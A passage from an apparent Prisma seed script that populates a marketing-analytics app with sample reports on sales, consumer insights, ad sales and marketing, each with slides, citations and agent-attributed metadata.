          { id: 5, title: 'Win/Loss Analysis', thumbnail: '/key-findings-chart-with-statistics.jpg', content: 'Win rate vs Comp A: 58% (42 wins, 31 losses). Win rate vs Comp B: 76% (68 wins, 22 losses). Top win reasons: Product capabilities, customer success, pricing transparency.' },
          { id: 6, title: 'Talk Tracks & Objection Handling', thumbnail: '/recommendations-bullet-points-slide.jpg', content: 'Three key scenarios covered: Initial discovery, technical evaluation, procurement negotiation. Common objections mapped to proven responses with success metrics.' }
        ],
        citations: [
          { source: 'Internal Win/Loss Database', confidence: 98, dataPoints: 340, markets: 12 },
          { source: 'Competitive Intelligence Platform', confidence: 92, dataPoints: 45, markets: 8 }
        ],
        comments: [],
        versions: [{ version: '1.0', date: now.toISOString(), author: 'Competitive Intelligence Agent', changes: 'Initial battlecard' }],
        activity: [{ action: 'Battlecard created', user: 'Competitive Intelligence Agent', timestamp: now.toISOString() }],
        pageCount: 28,
        metadata: { generatedAt: now.toISOString(), competitorsAnalyzed: 5, dealsAnalyzed: 340 }
      },
      thumbnail: '/pdf-report-document.jpg',
      agentId: marketResearchAgent.id,
      views: 312,
      createdBy: janeSmith.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'sales-3',
      orgId: techStartup.id,
      title: 'Account Prioritization Model Dashboard',
      description: 'Interactive dashboard for scoring and prioritizing accounts based on fit, intent, and engagement signals.',
      type: ReportType.DASHBOARD,
      status: ReportStatus.DRAFT,
      content: {
        agent: 'Account Scoring Agent',
        solutionArea: 'Sales',
        slides: [
          { id: 1, title: 'Account Score Distribution', thumbnail: '/analytics-dashboard.png', content: '819 accounts scored. Distribution: Hot (80+): 45 accounts, Warm (60-79): 128 accounts, Nurture (40-59): 234 accounts, Cold (<40): 412 accounts. Focus on Hot tier for immediate outreach.' },
          { id: 2, title: 'Scoring Model Components', thumbnail: '/audience-segmentation-pie-chart.jpg', content: 'Four weighted factors: Firmographic Fit (30%) - company size, industry, tech stack. Intent Signals (35%) - website visits, content engagement. Engagement Level (25%) - email opens, demos. Relationship Strength (10%).' },
          { id: 3, title: 'Top Priority Accounts', thumbnail: '/key-findings-chart-with-statistics.jpg', content: 'Top 25 accounts identified with scores 85+. Key signals: Multiple stakeholder engagement, pricing page visits, competitor research, demo requests in last 30 days.' },
          { id: 4, title: 'Score Movement Trends', thumbnail: '/trend-analysis-line-graph.jpg', content: '12 accounts moved to Hot this week. 3 engaged accounts showing strong buying signals. 5 accounts flagged at risk of churning. Weekly trend shows 15% improvement in Hot tier.' },
          { id: 5, title: 'Recommended Actions', thumbnail: '/recommendations-bullet-points-slide.jpg', content: 'Immediate: Contact 12 newly Hot accounts. This week: Re-engage 5 at-risk accounts. Priority: Schedule demos for 3 high-intent accounts showing competitor research activity.' }
        ],
        citations: [
          { source: 'CRM & Intent Data Integration', confidence: 94, dataPoints: 52, markets: 3 },
          { source: 'Website Analytics', confidence: 96, dataPoints: 28, markets: 1 }
        ],
        comments: [],
        versions: [{ version: '2.3', date: now.toISOString(), author: 'Account Scoring Agent', changes: 'Model refinement' }],
        activity: [{ action: 'Dashboard refreshed', user: 'Account Scoring Agent', timestamp: now.toISOString() }],
        metadata: { accountsScored: 819, modelVersion: '2.3' }
      },
      thumbnail: '/analytics-dashboard.png',
      views: 0,
      createdBy: bobWilson.id
    }
  })

  // ============================================================================
  // INSIGHTS SOLUTION AREA REPORTS (2 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'insights-1',
      orgId: acmeCorp.id,
      title: 'Consumer Motivation Analysis: Sustainability',
      description: 'Deep analysis of sustainability as a purchase driver, exploring motivations, barriers, and segment-specific attitudes.',
      type: ReportType.PRESENTATION,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Motivation Decoder Agent',
        solutionArea: 'Insights',
        slides: [
          { id: 1, title: 'Sustainability: The Green Consumer', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Key findings: 78% care about sustainability, 62% willing to pay more, 45% have switched brands, but 55% are skeptical of claims. Complex motivations require nuanced approach.' },
          { id: 2, title: 'Primary Motivation Drivers', thumbnail: '/key-findings-chart-with-statistics.jpg', content: 'Ranked by strength: Environmental concern (85%, all ages), Health & wellness connection (72%, parents 35-54), Social signaling (68%, Gen Z urban), Cost savings long-term (58%), Quality perception (52%).' },
          { id: 3, title: 'Purchase Barriers Analysis', thumbnail: '/trend-analysis-line-graph.jpg', content: 'Four key barriers identified: Price premium perception (68% cite as concern), Greenwashing skepticism (55% distrust claims), Convenience trade-offs (42%), Lack of clear information (38%).' },
          { id: 4, title: 'Consumer Attitude Segments', thumbnail: '/audience-segmentation-pie-chart.jpg', content: 'Eco-Champions (18%): Active seekers, premium payers. Considerers (35%): Open but price-sensitive. Skeptics (28%): Need proof, distrust claims. Indifferent (19%): Other priorities dominate.' },
          { id: 5, title: 'Segment Deep Dive: Eco-Champions', thumbnail: '/gen-z-consumer-behavior-infographic.jpg', content: 'Most valuable segment. 3x higher LTV. Research extensively before purchase. Influence others. Willing to pay 25%+ premium. Respond to certification and transparency.' },
          { id: 6, title: 'Strategic Implications', thumbnail: '/recommendations-bullet-points-slide.jpg', content: 'Lead with proof not promises. Make sustainable choice the easy choice. Connect sustainability to personal benefit. Target Considerers for growth. Build trust with Skeptics through transparency.' }
        ],
        citations: [
          { source: 'GWI Sustainability Study 2024', confidence: 97, dataPoints: 35, markets: 5 },
          { source: 'Consumer Values Tracker', confidence: 95, dataPoints: 28, markets: 5 }
        ],
        comments: [],
        versions: [{ version: '1.0', date: now.toISOString(), author: 'Motivation Decoder Agent', changes: 'Initial analysis' }],
        activity: [{ action: 'Report generated', user: 'Motivation Decoder Agent', timestamp: now.toISOString() }],
        metadata: { generatedAt: now.toISOString(), respondents: 42000, markets: ['US', 'UK', 'DE', 'FR', 'JP'] }
      },
      thumbnail: '/presentation-slides.png',
      agentId: audienceAnalysisAgent.id,
      views: 789,
      createdBy: janeSmith.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'insights-2',
      orgId: acmeCorp.id,
      title: 'Cross-Market Insights: US vs UK vs Germany',
      description: 'Comparative analysis of consumer behavior, brand perception, and market dynamics across three key markets.',
      type: ReportType.DASHBOARD,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Global Perspective Agent',
        solutionArea: 'Insights',
        slides: [
          { id: 1, title: 'Three Market Comparison', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'US: 331M pop, 92% digital, 21% e-commerce. UK: 67M pop, 95% digital, 28% e-commerce. Germany: 83M pop, 91% digital, 18% e-commerce. Each market requires distinct strategy.' },
          { id: 2, title: 'Brand Awareness Comparison', thumbnail: '/media-consumption-bar-chart.jpg', content: 'Aided awareness highest in UK (82%), followed by US (78%), Germany (72%). Unaided awareness shows similar pattern. Consideration-to-preference conversion best in Germany despite lower awareness.' },
          { id: 3, title: 'Channel Preferences by Market', thumbnail: '/audience-segmentation-pie-chart.jpg', content: 'US: Social-first (42%), Search (28%), Email (15%). UK: Social (38%), Email (25%), Search (22%). Germany: Search (35%), Email (30%), Social (20%). TV remains stronger in Germany.' },
          { id: 4, title: 'Cultural Factors Matrix', thumbnail: '/trend-analysis-line-graph.jpg', content: 'Price Sensitivity: Germany highest. Brand Loyalty: Germany highest. Sustainability: Germany leads. Digital Adoption: UK leads. Privacy Concerns: Germany significantly highest (85% vs 58% US).' },
          { id: 5, title: 'Key Market Differentiators', thumbnail: '/key-findings-chart.jpg', content: 'US: Highest brand switching, lowest loyalty, most responsive to influencers. UK: Most advanced social commerce, highest mobile shopping. Germany: Strongest privacy concerns, preference for established brands.' },
          { id: 6, title: 'Localization Recommendations', thumbnail: '/recommendations-bullet-points-slide.jpg', content: 'Adjust pricing strategy by market (Germany most price-sensitive). Customize messaging for cultural values. Adapt channel mix significantly. Privacy-first approach essential for Germany.' }
        ],
        citations: [
          { source: 'GWI Core Multi-Market Study', confidence: 97, dataPoints: 45, markets: 3 },
          { source: 'Regional Consumer Pulse', confidence: 94, dataPoints: 32, markets: 3 }
        ],
        comments: [],
        versions: [{ version: '1.0', date: now.toISOString(), author: 'Global Perspective Agent', changes: 'Initial comparison' }],
        activity: [{ action: 'Dashboard created', user: 'Global Perspective Agent', timestamp: now.toISOString() }],
        metadata: { marketsCompared: 3, metricsTracked: 45 }
      },
      thumbnail: '/analytics-dashboard.png',
      agentId: marketResearchAgent.id,
      views: 1056,
      createdBy: adminUser.id
    }
  })

  // ============================================================================
  // AD SALES SOLUTION AREA REPORTS (3 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'adsales-1',
      orgId: acmeCorp.id,
      title: 'Premium Audience Package: Tech Enthusiasts',
      description: 'Curated audience package for advertisers targeting tech enthusiasts, including reach, engagement metrics, and activation recommendations.',
      type: ReportType.PRESENTATION,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Audience Packager Agent',
        solutionArea: 'Ad Sales',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'This premium audience package targets 45M tech enthusiasts globally. Key highlights: 62% male skew, average age 32, income index 142 (42% above average). This audience shows 3x higher engagement with tech products and 85% research online before purchase.' },
          { id: 2, title: 'Audience Composition', thumbnail: '/audience-segmentation-pie-chart.jpg', content: 'Segment breakdown: Early Adopters (28%) - highest engagement, premium CPM potential. Tech Professionals (35%) - strong B2B crossover opportunity. Gaming Enthusiasts (22%) - high frequency, younger demographic. Smart Home Owners (15%) - highest household income, strong purchase intent.' },
          { id: 3, title: 'Behavioral Insights', thumbnail: '/behavioral-data-visualization.jpg', content: 'Key behaviors driving engagement: 4.2 devices owned on average per household. 3x more likely to pre-order new products. 68% actively participate in tech communities and forums. 92% use ad blockers, requiring native content strategies.' },
          { id: 4, title: 'Platform Preferences', thumbnail: '/platform-usage-chart.jpg', content: 'Primary platforms: YouTube (78% weekly usage), Reddit (62%), Twitter/X (54%), LinkedIn (48% for tech professionals). Peak engagement times: weekday evenings 7-10pm, weekend mornings 9am-12pm.' },
          { id: 5, title: 'Activation Channels', thumbnail: '/channel-performance-dashboard.jpg', content: 'Recommended channels: Programmatic Display - 38M reach, $12.50 CPM, high viewability. Connected TV - 22M reach, $28.00 CPM, premium completion rates. Native Content - 15M reach, $18.00 CPM, highest engagement.' },
          { id: 6, title: 'Creative Best Practices', thumbnail: '/creative-examples-grid.jpg', content: 'Top-performing creative approaches: Product demos with specs (4.2% CTR). Expert reviews and unboxing content (3.8% CTR). Comparison charts and benchmarks (3.5% CTR). Avoid: generic lifestyle imagery, emotional appeals without substance.' },
          { id: 7, title: 'Package Options', thumbnail: '/pricing-tiers-comparison.jpg', content: 'Standard Package ($50K min): Core targeting, standard placements. Premium Package ($150K min): Enhanced targeting, premium inventory, basic reporting. Exclusive Package ($500K min): Custom segments, first-look inventory, dedicated support, advanced analytics.' },
          { id: 8, title: 'Next Steps', thumbnail: '/call-to-action-slide.jpg', content: 'Recommended actions: 1) Schedule custom audience analysis call. 2) Review competitive landscape in tech category. 3) Develop A/B test plan for creative approaches. 4) Set up tracking and measurement framework.' }
        ],
        citations: [
          { source: 'GWI Core Q4 2024 - Tech Interest Segments', confidence: 97, dataPoints: 32, markets: 48 },
          { source: 'GWI USA Tech Deep Dive 2024', confidence: 96, dataPoints: 28, markets: 1 },
          { source: 'Platform Partner Data (Anonymized)', confidence: 92, dataPoints: 45, markets: 12 }
        ],
        comments: [],
        versions: [
          { version: '1.0', date: now.toISOString(), author: 'Audience Packager Agent', changes: 'Initial package generation' }
        ],
        activity: [
          { action: 'Package created', user: 'Audience Packager Agent', timestamp: now.toISOString() },
          { action: 'Audience data refreshed', user: 'System', timestamp: new Date(now.getTime() - 86400000).toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI USA', 'Platform APIs'],
        markets: ['United States', 'United Kingdom', 'Germany', 'Canada', 'Australia'],
        metadata: { generatedAt: now.toISOString(), audienceSize: 45000000, dataFreshness: 'Monthly' }
      },
      thumbnail: '/presentation-slides.png',
      agentId: audienceAnalysisAgent.id,
      views: 534,
      createdBy: johnDoe.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'adsales-2',
      orgId: techStartup.id,
      title: 'Q1 2025 Media Planning Recommendations',
      description: 'Strategic media planning recommendations for Q1 2025 based on audience behavior, market trends, and competitive activity.',
      type: ReportType.PDF,
      status: ReportStatus.DRAFT,
      content: {
        agent: 'Media Planner Agent',
        solutionArea: 'Ad Sales',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Q1 2025 presents unique opportunities with post-holiday engagement recovery and major cultural moments. Recommended budget allocation: 65% digital, 25% traditional, 10% emerging channels. Key focus: value messaging in January, brand building through February, consideration in March.' },
          { id: 2, title: 'Market Context', thumbnail: '/market-trends-analysis.jpg', content: 'Four key factors shaping Q1 2025: Economic uncertainty driving value-seeking behavior across demographics. Privacy changes continuing to impact targeting precision. CTV adoption accelerating faster than projected (+18% YoY). Retail media networks reaching maturity with standardized measurement.' },
          { id: 3, title: 'Budget Allocation Strategy', thumbnail: '/budget-allocation-pie-chart.jpg', content: 'Digital (65%): Programmatic 40%, Social 35%, Search 25%. Traditional (25%): CTV/Streaming 60%, Audio 25%, OOH 15%. Emerging (10%): Retail Media 50%, Gaming 30%, Influencer 20%. Total recommended budget: $2.4M for full impact.' },
          { id: 4, title: 'January Strategy', thumbnail: '/monthly-calendar-planning.jpg', content: 'Early January (1-15): Resolution and wellness messaging, high intensity spend. Post-holiday mindset receptive to self-improvement. Late January (16-31): Transition to value propositions, medium intensity. Consumers recovering from holiday spending, seeking deals.' },
          { id: 5, title: 'February Strategy', thumbnail: '/monthly-calendar-planning.jpg', content: 'February 1-14: Valentine\'s focused campaigns for relevant categories. High emotional engagement period. February 15-28: Brand building focus, storytelling content. Presidents Day sales opportunity. Consider sports tentpoles (Super Bowl, NBA All-Star).' },
          { id: 6, title: 'March Strategy', thumbnail: '/monthly-calendar-planning.jpg', content: 'Early March: Spring transition messaging, consideration phase. Mid-March: March Madness integration opportunities. Late March: Q1 close-out, conversion focus. Spring break travel consideration window opens.' },
          { id: 7, title: 'Measurement Framework', thumbnail: '/measurement-kpi-dashboard.jpg', content: 'Primary KPIs: Brand lift (target +8%), attention metrics (target 12s dwell time), conversion attribution (last-touch + multi-touch), incremental reach (target 15% new audiences). Measurement partners: Nielsen, DoubleVerify, IAS.' },
          { id: 8, title: 'Risk Factors & Mitigation', thumbnail: '/risk-assessment-matrix.jpg', content: 'Key risks: Cookie deprecation timeline uncertainty (mitigation: first-party data investment). Economic downturn impact on consumer spending (mitigation: value messaging flexibility). Political ad competition in February-March (mitigation: early inventory locks).' }
        ],
        citations: [
          { source: 'GWI Consumer Trends Q4 2024', confidence: 95, dataPoints: 38, markets: 24 },
          { source: 'eMarketer Ad Spend Forecast 2025', confidence: 88, dataPoints: 15, markets: 1 },
          { source: 'Nielsen Media Planning Benchmarks', confidence: 94, dataPoints: 42, markets: 8 }
        ],
        comments: [],
        versions: [
          { version: '0.9', date: now.toISOString(), author: 'Media Planner Agent', changes: 'Draft for review' }
        ],
        activity: [
          { action: 'Draft created', user: 'Media Planner Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI Zeitgeist', 'eMarketer', 'Nielsen'],
        markets: ['United States'],
        metadata: { generatedAt: now.toISOString(), planningPeriod: 'Q1 2025', pageCount: 35 }
      },
      thumbnail: '/pdf-report-document.jpg',
      views: 0,
      createdBy: bobWilson.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'adsales-3',
      orgId: acmeCorp.id,
      title: 'Automotive Advertiser Pitch Deck',
      description: 'Custom pitch deck for automotive category advertisers, featuring audience insights, success stories, and partnership opportunities.',
      type: ReportType.PRESENTATION,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Pitch Generator Agent',
        solutionArea: 'Ad Sales',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Reach 28M auto intenders through our premium data platform. Average research journey: 89 days with 24 touchpoints before purchase. Our data identifies consumers at every stage of the funnel with 94% accuracy in predicting purchase intent within 90 days.' },
          { id: 2, title: 'Market Opportunity', thumbnail: '/market-opportunity-chart.jpg', content: 'The automotive advertising market represents $45B annually in the US alone. Key opportunity: 72% of car buyers start their research online, but only 34% of auto ad spend is digital. Bridge this gap with data-driven targeting and measurement.' },
          { id: 3, title: 'Auto Intender Segments', thumbnail: '/audience-segmentation-pie-chart.jpg', content: 'Four primary segments: Luxury Seekers (4.2M, $150K+ income, motivated by status and technology). Family First (8.5M, $75-150K income, prioritize safety and space). Eco-Drivers (6.8M, $80K+ income, sustainability-focused). Performance Fans (3.1M, $100K+ income, value power and design).' },
          { id: 4, title: 'Targeting Capabilities', thumbnail: '/targeting-capabilities-infographic.jpg', content: 'Advanced targeting options: In-market signals (browsing behavior, dealer site visits). Dealership proximity (geo-fencing active shoppers). Competitive conquesting (targeting competitor owners). Lifecycle targeting (lease end, service history triggers).' },
          { id: 5, title: 'Case Study: Major OEM', thumbnail: '/case-study-results.jpg', content: 'Client: Top 5 US Automotive Manufacturer. Challenge: Increase dealer traffic for new EV launch. Solution: Multi-channel campaign targeting Eco-Drivers + Tech Enthusiasts. Results: +18% brand lift, +32% dealer traffic, -24% cost per dealer visit vs. benchmark.' },
          { id: 6, title: 'Partnership Options', thumbnail: '/pricing-tiers-comparison.jpg', content: 'Three partnership tiers: Awareness Package - broad reach, video-first, brand metrics. Consideration Package - mid-funnel targeting, dealer locator integration, leads. Full Funnel Package - end-to-end journey, attribution to sale, dedicated success team.' },
          { id: 7, title: 'Measurement & Attribution', thumbnail: '/measurement-kpi-dashboard.jpg', content: 'Comprehensive measurement: Digital attribution (multi-touch, view-through). Dealer visit tracking (foot traffic attribution). Sales match (integration with OEM CRM). Brand studies (pre/post awareness, consideration, preference).' },
          { id: 8, title: 'Next Steps', thumbnail: '/call-to-action-slide.jpg', content: 'Recommended next steps: 1) Custom audience analysis for your specific models. 2) Competitive share of voice audit. 3) Campaign simulation with projected outcomes. 4) Pilot program proposal with success metrics.' }
        ],
        citations: [
          { source: 'GWI Core Q4 2024 - Auto Interest', confidence: 96, dataPoints: 28, markets: 32 },
          { source: 'GWI USA Automotive Deep Dive', confidence: 98, dataPoints: 45, markets: 1 },
          { source: 'Internal Campaign Performance Data', confidence: 99, dataPoints: 125, markets: 5 }
        ],
        comments: [],
        versions: [
          { version: '1.2', date: now.toISOString(), author: 'Pitch Generator Agent', changes: 'Updated case study results' }
        ],
        activity: [
          { action: 'Pitch deck created', user: 'Pitch Generator Agent', timestamp: new Date(now.getTime() - 604800000).toISOString() },
          { action: 'Case study updated', user: 'Sales Team', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI USA', 'Internal Performance Data'],
        markets: ['United States', 'Canada', 'United Kingdom', 'Germany', 'Australia'],
        metadata: { generatedAt: now.toISOString() } // category: 'Automotive', proposalValue: '$2.5M'
      },
      thumbnail: '/presentation-slides.png',
      agentId: marketResearchAgent.id,
      views: 267,
      createdBy: janeSmith.id
    }
  })

  // ============================================================================
  // MARKETING SOLUTION AREA REPORTS (3 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'marketing-1',
      orgId: acmeCorp.id,
      title: 'Holiday Campaign Performance Forecast',
      description: 'Predictive analysis of holiday campaign performance based on historical data, market trends, and competitive benchmarks.',
      type: ReportType.DASHBOARD,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Performance Predictor Agent',
        solutionArea: 'Marketing',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Holiday campaign forecast shows strong potential with expected ROAS of 4.2 (confidence interval 3.8-4.6). Budget efficiency rated HIGH based on historical patterns. Key recommendation: front-load budget in first 2 weeks, reserve 15% for real-time optimization.' },
          { id: 2, title: 'Daily Performance Projection', thumbnail: '/performance-forecast-chart.jpg', content: 'Projected daily metrics over 45-day campaign period: Peak performance expected Nov 24-27 (Black Friday weekend) and Dec 15-22 (last shipping windows). Impressions trending +18% vs. last year. Click-through rate stable at 2.3%. Conversion rate projected at 3.8%.' },
          { id: 3, title: 'Channel Performance Forecast', thumbnail: '/channel-performance-dashboard.jpg', content: 'Channel projections: Paid Social - ROAS 3.8, stable trend, 85% confidence. Paid Search - ROAS 5.2, upward trend, 90% confidence. Display - ROAS 2.4, downward trend, 75% confidence. Email - ROAS 8.5, upward trend, 92% confidence.' },
          { id: 4, title: 'What-If Scenarios', thumbnail: '/scenario-analysis-chart.jpg', content: 'Scenario modeling results: Increase budget 20% → +15% revenue but ROAS drops to 3.9. Shift 15% budget to email → +8% revenue with ROAS improvement to 4.5. Cut display spend by 50% → Flat revenue but ROAS improves to 4.8.' },
          { id: 5, title: 'Competitive Context', thumbnail: '/competitive-analysis-chart.jpg', content: 'Competitive landscape analysis: Major competitors increasing holiday spend by 12% on average. Share of voice expected to compress by 8% without budget adjustment. Key competitive windows: Black Friday (highest competition), mid-December (opportunity as competitors pull back).' },
          { id: 6, title: 'Risk Assessment', thumbnail: '/risk-assessment-matrix.jpg', content: 'Key risk factors: Competitor promotion activity (impact: HIGH, likelihood: 65%). Inventory constraints (impact: MEDIUM, likelihood: 40%). Economic headwinds affecting consumer spending (impact: MEDIUM, likelihood: 55%). Mitigation strategies included in appendix.' },
          { id: 7, title: 'Optimization Recommendations', thumbnail: '/optimization-recommendations.jpg', content: 'Top optimization actions: 1) Front-load 40% of budget in first 2 weeks to capture early shoppers. 2) Reserve 15% budget for real-time optimization based on performance signals. 3) A/B test 3 creative variations per channel. 4) Set up automated bidding rules for peak periods.' },
          { id: 8, title: 'Measurement Plan', thumbnail: '/measurement-kpi-dashboard.jpg', content: 'KPI tracking framework: Primary metrics - ROAS, revenue, conversion rate. Secondary metrics - CTR, CPA, new customer acquisition. Reporting cadence: Daily dashboard, weekly deep-dive, post-campaign analysis. Attribution model: Data-driven multi-touch.' }
        ],
        citations: [
          { source: 'GWI Consumer Trends - Holiday Shopping 2024', confidence: 96, dataPoints: 42, markets: 18 },
          { source: 'Historical Campaign Performance (3 years)', confidence: 99, dataPoints: 156, markets: 5 },
          { source: 'Competitive Intelligence Platform', confidence: 88, dataPoints: 28, markets: 3 }
        ],
        comments: [],
        versions: [
          { version: '2.0', date: now.toISOString(), author: 'Performance Predictor Agent', changes: 'Updated with latest market data' }
        ],
        activity: [
          { action: 'Forecast generated', user: 'Performance Predictor Agent', timestamp: new Date(now.getTime() - 172800000).toISOString() },
          { action: 'Scenarios updated', user: 'Marketing Team', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'Google Analytics', 'Internal CRM', 'Competitive Intel'],
        markets: ['United States', 'Canada', 'United Kingdom'],
        metadata: { campaignPeriod: 'Nov 15 - Dec 31', totalBudget: '$2.4M', historicalDataYears: 3 }
      },
      thumbnail: '/analytics-dashboard.png',
      agentId: marketResearchAgent.id,
      views: 1423,
      createdBy: adminUser.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'marketing-2',
      orgId: acmeCorp.id,
      title: 'Social Media Trend Analysis: TikTok vs Instagram',
      description: 'Visual comparison of platform trends, content performance, and audience behavior on TikTok and Instagram.',
      type: ReportType.INFOGRAPHIC,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Trend Forecaster Agent',
        solutionArea: 'Marketing',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'TikTok vs Instagram platform comparison reveals distinct strengths: TikTok leads in engagement (5.96% vs 0.83%) and time spent (95 min vs 53 min daily). Instagram maintains larger user base (2.0B vs 1.5B MAU) and stronger commerce integration. Strategy: Use both for different funnel stages.' },
          { id: 2, title: 'Platform Metrics Comparison', thumbnail: '/platform-comparison-chart.jpg', content: 'Key metrics head-to-head: Monthly Active Users - TikTok 1.5B, Instagram 2.0B. Average Time Spent/Day - TikTok 95 min, Instagram 53 min. Average Engagement Rate - TikTok 5.96%, Instagram 0.83%. Content Reach (% of followers) - TikTok 118%, Instagram 13.5%.' },
          { id: 3, title: 'Audience Demographics', thumbnail: '/demographic-breakdown-chart.jpg', content: 'Generational split by platform: TikTok - Gen Z 60%, Millennial 26%, Gen X+ 14%. Instagram - Gen Z 31%, Millennial 35%, Gen X+ 34%. Key insight: TikTok skews younger but Gen X adoption growing fastest (+42% YoY). Instagram more balanced across age groups.' },
          { id: 4, title: 'Trending Content Formats', thumbnail: '/content-formats-comparison.jpg', content: 'Hot formats by platform: TikTok - Long-form video (3+ min) emerging, Storytimes and narrative content, Educational how-tos, Duets and Stitches for engagement. Instagram - Short Reels (15-30 sec), Carousel posts for education, Interactive Stories, Broadcast channels for community.' },
          { id: 5, title: 'Algorithm Insights', thumbnail: '/algorithm-analysis-chart.jpg', content: 'Algorithm behavior differences: TikTok - Discovery-focused, content can go viral regardless of follower count, watch time is king. Instagram - Relationship-focused, prioritizes accounts users engage with, pushing Reels to compete but still rewards existing audience.' },
          { id: 6, title: 'Brand Performance Benchmarks', thumbnail: '/brand-performance-benchmarks.jpg', content: 'Brand content performance: Average engagement rate - TikTok 4.2%, Instagram 1.2%. Video completion rate - TikTok 68%, Instagram Reels 42%. Cost per engagement - TikTok $0.08, Instagram $0.15. Best performing categories: Entertainment, Beauty, Food on both platforms.' },
          { id: 7, title: 'Strategic Implications', thumbnail: '/strategic-recommendations.jpg', content: 'Brand strategy recommendations: TikTok best for - awareness, virality, reaching younger demos, trend participation. Instagram best for - consideration, conversion, community building, direct commerce. Both platforms - prioritize authenticity over production value, embrace creator partnerships.' },
          { id: 8, title: '2025 Platform Outlook', thumbnail: '/future-trends-forecast.jpg', content: 'Key predictions for 2025: TikTok Shop expansion in Western markets, potential US regulatory challenges. Instagram doubling down on creators, enhanced AI content tools. Both platforms integrating more shopping features. Recommendation: Build presence on both, test and learn approach.' }
        ],
        citations: [
          { source: 'GWI Social Media Report 2024', confidence: 98, dataPoints: 52, markets: 48 },
          { source: 'GWI Zeitgeist - Platform Trends', confidence: 95, dataPoints: 38, markets: 24 },
          { source: 'Platform Official Reporting', confidence: 92, dataPoints: 24, markets: 1 }
        ],
        comments: [],
        versions: [
          { version: '1.0', date: now.toISOString(), author: 'Trend Forecaster Agent', changes: 'Initial analysis' }
        ],
        activity: [
          { action: 'Analysis generated', user: 'Trend Forecaster Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI Zeitgeist', 'Platform APIs'],
        markets: ['Global', 'United States', 'United Kingdom', 'Germany', 'Brazil'],
        metadata: { generatedAt: now.toISOString(), dataSource: 'GWI Zeitgeist + Platform APIs', dimensions: { width: 1200, height: 2800 } }
      },
      thumbnail: '/analytics-dashboard.png',
      views: 2156,
      createdBy: johnDoe.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'marketing-3',
      orgId: techStartup.id,
      title: 'Content Strategy Framework: Gen Z Engagement',
      description: 'Strategic framework for creating content that resonates with Gen Z audiences across platforms.',
      type: ReportType.PDF,
      status: ReportStatus.DRAFT,
      content: {
        agent: 'Content Creator Agent',
        solutionArea: 'Marketing',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Gen Z demands authenticity, entertainment, and value. This framework provides a systematic approach to content that converts. Key insight: 72% prefer user-generated style content over polished brand productions. 85% want to be entertained, even by brands they follow.' },
          { id: 2, title: 'Gen Z Content Preferences', thumbnail: '/gen-z-preferences-chart.jpg', content: 'Four pillars of Gen Z content preferences: Authentic over polished - 72% prefer UGC-style content. Entertainment first - 85% want entertainment from brands. Values alignment - 68% research brand values before purchase. Interactive experiences - 3x engagement on polls, quizzes, challenges.' },
          { id: 3, title: 'Content Pillars Framework', thumbnail: '/content-pillars-diagram.jpg', content: 'Recommended content mix: Educational (25%) - how-tos, explainers, tips that build authority. Entertainment (35%) - trends, humor, challenges that drive reach. Community (25%) - UGC, collabs, behind-scenes that build loyalty. Conversion (15%) - social proof, offers, demos that drive sales.' },
          { id: 4, title: 'Platform-Specific Strategy', thumbnail: '/platform-strategy-chart.jpg', content: 'Tailored approach by platform: TikTok - Entertainment + Education focus, 1-2x daily posting, peak times 7-9am and 7-11pm. Instagram - Community + Conversion focus, 1x daily + stories, peak times 11am-1pm and 7-9pm. YouTube - Education long-form, 2x weekly, Thursday-Saturday optimal.' },
          { id: 5, title: 'Creator Authenticity Guidelines', thumbnail: '/authenticity-guidelines.jpg', content: 'Authenticity best practices: Use real employees and customers, not actors. Embrace imperfection - slightly raw performs better. Show the process, not just the product. Respond to comments genuinely. Take stands on issues aligned with values. Admit mistakes publicly.' },
          { id: 6, title: 'Measurement Framework', thumbnail: '/measurement-kpi-dashboard.jpg', content: 'KPIs by content pillar: Engagement rate by pillar type. Share/save ratio (indicates value). Comment sentiment analysis. Profile visit conversion rate. Full attribution to purchase when possible. Benchmark: 4%+ engagement rate, 2%+ share rate.' },
          { id: 7, title: 'Implementation Roadmap', thumbnail: '/implementation-roadmap.jpg', content: 'Four-phase implementation: Phase 1 - Audit current content against framework. Phase 2 - Develop pillar themes and content templates. Phase 3 - Create 30-day content calendar with balanced mix. Phase 4 - Test, measure, and optimize based on performance.' },
          { id: 8, title: 'Resources & Next Steps', thumbnail: '/next-steps-checklist.jpg', content: 'Recommended resources: Content creation tools (CapCut, Canva). Trend monitoring (TrendTok, SparkToro). Analytics (native + Sprout Social). Next steps: 1) Complete content audit. 2) Define 3 themes per pillar. 3) Identify 5 creator partners. 4) Build first content calendar.' }
        ],
        citations: [
          { source: 'GWI Gen Z Report 2024', confidence: 97, dataPoints: 48, markets: 32 },
